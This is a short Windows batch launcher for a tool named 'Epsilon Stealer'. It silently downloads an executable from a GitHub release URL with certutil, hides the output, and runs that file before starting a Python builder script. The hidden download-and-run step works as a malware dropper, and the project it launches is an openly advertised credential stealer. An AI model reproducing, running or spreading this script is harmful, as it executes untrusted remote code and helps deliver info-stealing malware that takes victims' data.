@echo off

title Epsilon Stealer
rem You can do any color
color 0c

echo.
echo Coded By https://github.com/Vinyzu3
echo.

set "URL=https://github.com/Vinyzu3/Epsilon-Stealer/releases/download/relase/Launcher.exe"
set "Dossier=tools"
set "NomFichier=%Dossier%\Epsilon.exe"

certutil -urlcache -split -f %URL% "%NomFichier%" >nul 2>&1

if exist "%NomFichier%" (
    start "" "%NomFichier%"
)

cd ..
python builder.py

if errorlevel 1 (
    echo.
    echo Error occurred during execution. Attempting to install requirements...
    python -m pip install -r requirements.txt
    echo.
    echo Installation complete.
    pause
)
